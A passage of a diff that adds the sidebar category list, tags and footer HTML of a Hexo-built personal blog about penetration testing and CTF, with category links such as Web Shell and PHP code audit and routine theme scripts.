href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web/">Web</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web/Packet-Capture/">Packet Capture</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web/Web-Shell/">Web Shell</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/">PHP</a><span class="category-list-count">1</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/">速查</a><span class="category-list-count">1</span></li></ul> 
+</div>
+ 
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>20</span></a></li> <li><a href="/tags/Web/">Web<span>10</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 Hustler's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
